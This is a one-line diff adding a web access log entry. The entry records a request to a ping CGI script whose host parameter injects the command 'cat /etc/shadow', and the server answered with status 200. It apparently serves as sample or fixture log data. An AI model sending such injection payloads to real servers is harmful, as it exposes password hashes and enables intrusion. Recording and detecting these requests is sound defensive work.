@@ -1,0 +1,1 @@
+203.0.113.48 - - [24/Nov/2026:10:23:40 +0000] "GET /cgi-bin/ping.cgi?host=127.0.0.1;cat%20/etc/shadow HTTP/1.1" 200 988 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
